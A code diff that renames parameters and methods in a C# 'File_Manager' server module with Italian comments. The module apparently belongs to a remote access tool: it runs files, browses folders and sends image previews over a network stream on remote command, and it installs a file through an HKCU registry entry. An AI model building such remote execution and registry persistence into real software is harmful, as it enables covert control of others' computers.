@@ -22,17 +22,17 @@ namespace bc.srv.Muduli.File_Manager
         private string startRunMsg;
 
 
-        public FileManAction(string ctor_File, NetworkStream ctor_Net)
+        public FileManAction(string ctorFile, NetworkStream ctorNet)
         {
-            myNet = ctor_Net;
+            myNet = ctorNet;
 
             //COSTRUISCO LISTA DI FILE
-            fileNames = ctor_File.Split('*');
+            fileNames = ctorFile.Split('*');
         }
 
-        public FileManAction(NetworkStream ctor_Net)
+        public FileManAction(NetworkStream ctorNet)
         {
-            myNet = ctor_Net;
+            myNet = ctorNet;
         }
 
         /// <summary>
@@ -81,9 +81,9 @@ namespace bc.srv.Muduli.File_Manager
         /// <summary>
         ///     Nuovop thread Run Files file
         /// </summary>
-        public void StartRunFiles(string ctor_startRunMsg)
+        public void StartRunFiles(string ctorStartRunMsg)
         {
-            startRunMsg = ctor_startRunMsg;
+            startRunMsg = ctorStartRunMsg;
 
             var t = new Thread(RunFiles);
             t.IsBackground = true;
@@ -202,9 +202,9 @@ namespace bc.srv.Muduli.File_Manager
         /// <summary>
         ///     Nuovop thread Create New Folder
         /// </summary>
-        public void StartNewFolderCration(string ctor_NewFold)
+        public void StartNewFolderCration(string ctorNewFold)
         {
-            newFolder = ctor_NewFold;
+            newFolder = ctorNewFold;
 
             var t = new Thread(CreateNewFolder);
             t.IsBackground = true;
@@ -240,9 +240,9 @@ namespace bc.srv.Muduli.File_Manager
         /// <summary>
         ///     Nuovop thread Send Image Preview
         /// </summary>
-        public void StartImagePreview(string par_ImageFile)
+        public void StartImagePreview(string parImageFile)
         {
-            imagePreviewFileName = par_ImageFile;
+            imagePreviewFileName = parImageFile;
 
             var t = new Thread(SendImagePreview);
             t.IsBackground = true;
@@ -257,7 +257,7 @@ namespace bc.srv.Muduli.File_Manager
                 var siz = new Size(150, 150);
                 var iw = new ImageWorker();
                 var original = Image.FromFile(imagePreviewFileName);
-                var im = iw.resizeImage(original, siz);
+                var im = iw.ResizeImage(original, siz);
 
                 var thumbByte = iw.ImgToJpg(im, 50);
 
@@ -285,9 +285,9 @@ namespace bc.srv.Muduli.File_Manager
         /// <summary>
         ///     Nuovo thread invio preview per gallery
         /// </summary>
-        public void StartImageGallery(string par_ImageFile)
+        public void StartImageGallery(string parImageFile)
         {
-            imagePreviewFileName = par_ImageFile;
+            imagePreviewFileName = parImageFile;
 
             var t = new Thread(SendImageGallery);
             t.IsBackground = true;
@@ -302,7 +302,7 @@ namespace bc.srv.Muduli.File_Manager
                 var siz = new Size(150, 150);
                 var iw = new ImageWorker();
                 var original = Image.FromFile(imagePreviewFileName);
-                var im = iw.resizeImage(original, siz);
+                var im = iw.ResizeImage(original, siz);
 
                 var thumbByte = iw.ImgToJpg(im, 50);
                 //byte[] thumbByte = iw.imageToByteArray(im);
@@ -455,8 +455,8 @@ namespace bc.srv.Muduli.File_Manager
                     {
                         case "HKCU":
                             var rm = new RegistryManager();
-                            var hkcuOK = rm.AddHKCUReg(details[1], sFileToInstall);
-                            result += string.Format("HKCU-{0}|", hkcuOK);
+                            var hkcuOk = rm.AddHkcuReg(details[1], sFileToInstall);
+                            result += string.Format("HKCU-{0}|", hkcuOk);
                             break;
 
                         case "EXPL":
